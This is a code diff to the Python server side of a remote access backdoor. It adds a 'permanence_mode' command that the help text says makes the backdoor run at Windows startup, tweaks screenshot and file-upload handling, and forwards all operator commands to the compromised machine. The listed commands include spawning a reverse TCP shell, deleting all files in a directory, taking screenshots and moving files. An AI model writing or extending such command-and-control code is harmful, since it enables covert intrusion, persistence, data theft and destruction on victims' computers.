@@ -3,7 +3,6 @@ import sys
 import time
 import os
 import subprocess
-from typing import ContextManager
 ### Server
 
 class TcpServer:
@@ -173,7 +172,7 @@ class TcpServer:
 
                         self.client.send(message_command.encode())
                         print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
-                        screenshot_size = self.client.recv(1024).decode("utf-8")
+                        screenshot_size = self.client.recv(1024).decode("latin1")
                         int_screenshot_size = int(screenshot_size)
 
                         print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
@@ -187,7 +186,11 @@ class TcpServer:
                         print(f"\033[1;32m[+]\033[0;0m - Screenshot Download finished! File Size: {str(int_screenshot_size)} \nGoing Back to Input...")
                         continue
 
-
+                    if message_command == "permanence_mode":
+                        self.client.send(message_command.encode())
+                        reg_message = self.client.recv(1024).decode()
+                        print(reg_message)
+                        continue
 
                     # Uploading FIles
 
@@ -204,6 +207,8 @@ class TcpServer:
                         
                             data = os.path.getsize(location_filename)
                             self.client.send(str(data).encode("utf-8"))
+
+                            time.sleep(2)
 
                             with open(location_filename,"rb") as up:
                                 up_filedata = up.read()
@@ -279,7 +284,9 @@ class TcpServer:
             remove_all --> Removes all files in currently directory
             reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT
             download <file> --> Download files
-            permamence_mode --> Make Backdoor to initiate in windows startup \033[0;0m
+            permamence_mode --> Make Backdoor to initiate in windows startup
+            upload <path> <filename>
+            ex: upload /home/kleiton/Desktop/tools/ports.txt ports.txt \033[0;0m
             ---------------------------------------------            """)
                         continue
 
@@ -296,13 +303,13 @@ class TcpServer:
                         subprocess.Popen(f"cls", stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
                         continue
 
-                    if message_command.startswith("upload ") == False:
-                        message_command_encrypted = message_command.encode()
-                        self.client.send(message_command_encrypted)
-                        print('* Command sent!')
-                        receive_message = self.client.recv(1024)
-                        descrypt_message = receive_message.decode("latin1")
-                        print(f"{descrypt_message}")
+                    
+                    message_command_encrypted = message_command.encode()
+                    self.client.send(message_command_encrypted)
+                    print('* Command sent!')
+                    receive_message = self.client.recv(1024)
+                    descrypt_message = receive_message.decode("latin1")
+                    print(f"{descrypt_message}")
 
                     #if message_command.startswith("cat"):
                         #time.sleep(5)
